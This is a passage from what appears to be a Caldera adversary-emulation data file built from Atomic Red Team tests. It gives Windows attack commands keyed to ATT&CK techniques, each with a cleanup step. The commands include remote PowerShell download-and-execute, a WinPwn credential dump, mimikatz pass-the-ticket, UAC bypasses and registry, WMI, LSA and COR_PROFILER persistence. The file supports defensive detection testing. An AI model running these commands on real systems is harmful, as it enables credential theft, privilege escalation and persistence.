                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b6455f426a062f82fa5a1d128f46948",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0dbdf1a2a87e718a6ac8a8e3415a7fac": {
        "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f",
                    "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0dbdf1a2a87e718a6ac8a8e3415a7fac",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2af16dd43e4569a2d179ac46076a07d7": {
        "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.001",
            "name": "Event Triggered Execution: Change Default File Association"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "assoc  .hta=htafile",
                    "command": "assoc .hta=txtfile",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2af16dd43e4569a2d179ac46076a07d7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d1b64530f4db495d3bf05f8847f4599a": {
        "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "bc40cf_T1548.002.bat",
                    "payloads": [
                        "bc40cf_T1548.002.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d1b64530f4db495d3bf05f8847f4599a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d14ff07865705c9d9f5874d346520a03": {
        "description": "Similar to PTH, but attacking Kerberos\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.003",
            "name": "Use Alternate Authentication Material: Pass the Ticket"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "PathToAtomicsFolder\\T1550.003\\bin\\mimikatz.exe \"kerberos::ptt None\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d14ff07865705c9d9f5874d346520a03",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "16b7ce2e6bb3e3590fa3e0d6d2d8c6d8": {
        "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore ; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
                    "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan; New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value 83f016_T1574.012x64.dll -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null; Write-Host \"executing eventvwr.msc\" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "16b7ce2e6bb3e3590fa3e0d6d2d8c6d8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e9345933cc8cb67dbc560f3c2066edd0": {
        "description": "An adversary can modify the group policy settings.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1484.001",
            "name": "Domain Policy Modification: Group Policy Modification"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /f >nul 2>&1",
                    "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e9345933cc8cb67dbc560f3c2066edd0",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ad22a8ff48aa34cb1b3feb93d8326c33": {
        "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
                    "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ad22a8ff48aa34cb1b3feb93d8326c33",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ab5285e28e47e5d84dfac0678bfc73ec": {
        "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam_consumer'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam_filter'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "c:\\windows\\system32\\wbem\\mofcomp.exe 715d8f_T1546.003.mof",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "715d8f_T1546.003.mof"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ab5285e28e47e5d84dfac0678bfc73ec",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6bcf7989d751644f9c0e092fa6bf50c9": {
        "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Service -Name \"AtomicTestService_PowerShell\" 2>&1 | Out-Null; try {(Get-WmiObject Win32_Service -filter \"name='AtomicTestService_PowerShell'\").Delete()}; catch {}",
                    "command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"411da5_AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "411da5_AtomicService.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6bcf7989d751644f9c0e092fa6bf50c9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "610f43d452a3af7d336e471a170853c9": {
        "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1",
                    "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && fodhelper.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "610f43d452a3af7d336e471a170853c9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "89f71445dda60b4f8efc76e728e5ac65": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\33 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "89f71445dda60b4f8efc76e728e5ac65",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0856714c9810ac55b53e9964d02958a0": {
        "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0856714c9810ac55b53e9964d02958a0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1f15da077e50b6a18c8ad3305f8e4b6e": {
        "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.012",
            "name": "Hijack Execution Flow: COR_PROFILER"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH = ''",
                    "command": "$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '83f016_T1574.012x64.dll'; POWERSHELL -c 'Start-Sleep 1'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "83f016_T1574.012x64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "1f15da077e50b6a18c8ad3305f8e4b6e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "09f4739a13a4caf3b66b86aac880e3c0": {
        "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.005",
            "name": "Boot or Logon Autostart Execution: Security Support Provider"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += \"not-a-ssp\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "09f4739a13a4caf3b66b86aac880e3c0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ed65658e4431bc3b636dd0de29bf8e35": {
        "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.011",
            "name": "Event Triggered Execution: Application Shimming"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore; Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore",
                    "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed65658e4431bc3b636dd0de29bf8e35",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "163b023f43aba758d36f524d146cb8ea": {
        "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1",
                    "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "163b023f43aba758d36f524d146cb8ea",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "62cfa90fb03a6bc1a6ebcce8a3ea81b7": {
        "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1037.001",
            "name": "Boot or Logon Initialization Scripts: Logon Script (Windows)"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1 && del %temp%\\art.bat >nul 2>&1 && del \"%USERPROFILE%\\desktop\\T1037.001-log.txt\" >nul 2>&1",
                    "command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat && REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "62cfa90fb03a6bc1a6ebcce8a3ea81b7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "07017f58659d155169d160dbdf3d0747": {
        "description": "Leverage Global Flags Settings\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.012",
            "name": "Event Triggered Execution: Image File Execution Options Injection"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /f >nul 2>&1",
                    "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1 && REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "07017f58659d155169d160dbdf3d0747",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2f8f26ef6caacf086dd9b7f7b5031fa5": {
        "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.002",
            "name": "Authentication Package"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f; rm -force C:\\windows\\system32\\package.dll",
                    "command": "Copy-Item 864d47_package.dll C:\\Windows\\System32\\; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "864d47_package.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2f8f26ef6caacf086dd9b7f7b5031fa5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fe3527480a77ab0b52a518654e120b72": {
        "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.003",
            "name": "Valid Accounts: Local Accounts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); safedump -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fe3527480a77ab0b52a518654e120b72",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c2c084cc438ee70fe64355d6a9bcf354": {
        "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055",
            "name": "Process Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c2c084cc438ee70fe64355d6a9bcf354",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f36e12daa5c7606111a87fe00934529d": {
        "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.015",
            "name": "Boot or Logon Autostart Execution: Login Items"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "mv -Force ~\\AppData\\Local\\Temp\\settings.json ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json; taskkill /F /IM \"calculator.exe\" > $null",
                    "command": "mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"; wt.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f36e12daa5c7606111a87fe00934529d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e6aa3e0695f748b47ce54a4bb4e24a06": {
        "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.002",
            "name": "Hijack Execution Flow: DLL Side-Loading"
        },
        "platforms": {
            "windows": {
                "cmd": {
